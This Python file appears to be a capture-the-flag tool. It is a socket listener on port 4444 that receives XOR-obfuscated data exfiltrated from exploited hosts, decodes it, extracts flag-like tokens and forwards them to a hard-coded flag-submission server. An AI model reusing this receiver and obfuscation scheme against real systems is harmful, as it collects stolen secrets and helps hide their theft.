# file server that prints output received on the socket

import socket
import time
import requests
from urllib.parse import urljoin
from urllib.request import Request, urlopen
import json
import re

flag_regex = r'[A-Za-z0-9-_=]{20,}\.[A-Za-z0-9-_=]{20,}\.?[A-Za-z0-9-_.+\/=]*'

def decrypt_data(data):
    encoded = list(data)
    idx = 0
    for i in range(len(data)):
        encoded[i] = (encoded[i] ^ (((((idx << 4) + 97436)) ^ 0x69) & 0xff))
        if encoded[i] == ord("\n") and (i + 1 < len(data) and (encoded[i + 1] ^ ((((((i + 1) << 4) + 97436)) ^ 0x69) & 0xff)) != ord("\n")):
            idx = -1
        idx += 1

    return b"".join([bytes([x]) for x in encoded])

def post_flags(flags):
    sploit_name = "dealer"
        
    data = [{'flag': item, 'sploit': sploit_name, 'team': '?'}
            for item in flags]

    req = Request(urljoin("http://167.71.40.146:5000", '/api/post_flags'))
    req.add_header('Content-Type', 'application/json')
    # if args.token is not None:
    #     req.add_header('X-Token', args.token)
    with urlopen(req, data=json.dumps(data).encode(), timeout=5) as conn:
        if conn.status != 200:
            print(f"[-] Error posting flags: {conn.status}")

class Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        print(f"[INIT] Listening on {self.host}:{self.port}")

    def handle_client(self, client_socket):
        data = b""
        while True:
            aux = client_socket.recv(1024)
            if not aux:
                break
            data += aux

        
        print(f"[+] Received: {data}")
        flags = decrypt_data(data).split(b"\n")
        print(f"[+] Decrypted: {flags}")
        client_socket.close()
        # try:
        f = open("log.txt", "ab")
        flags = b"\n".join([_.replace(b"\n", b"") for _ in flags]).split(b"\n")
        aux = []
        for flag in flags:
            try:
                if len(flag):
                    aux.append(flag.decode())
            except:
                pass
        flags = "\n".join(aux)
            
        flags = re.findall(flag_regex, flags)
        print(f"[+] Flags: {flags}")

        try:
            post_flags(flags)
            print(f"[+] Flags posted")
        except Exception as e:
            print(f"[-] Error posting flags: {e}")
        
        tim = time.ctime()
        for flag in flags:
            if len(flag):
                f.write(f"[{tim}] {flag}\n".encode())
        f.close()
        # except:
        #     pass

        

    def run(self):
        while True:
            client, addr = self.server.accept()
            print(f"[+] Connection from {addr[0]}:{addr[1]}")
            self.handle_client(client)
            client.close()

if __name__ == "__main__":
    host = "0.0.0.0"
    port = 4444
    s = Server(host, port)
    s.run()